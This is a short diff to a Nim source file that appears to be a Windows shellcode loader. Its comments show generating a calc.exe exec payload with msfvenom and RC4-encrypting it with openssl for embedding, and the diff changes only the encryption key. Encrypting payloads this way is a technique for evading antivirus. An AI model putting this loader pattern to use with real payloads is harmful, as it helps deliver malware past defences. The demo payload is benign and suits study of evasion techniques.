@@ -2,7 +2,7 @@ import winim
 import winim/lean
 
 # msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
-# cat calc.bin | openssl enc -rc4 -nosalt -k "S3cur3Th1sSh1taaa" > enccalc.bin
+# cat calc.bin | openssl enc -rc4 -nosalt -k "aaaaaaaaaaaaaaaa" > enccalc.bin
 const encstring = slurp"enccalc.bin"
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
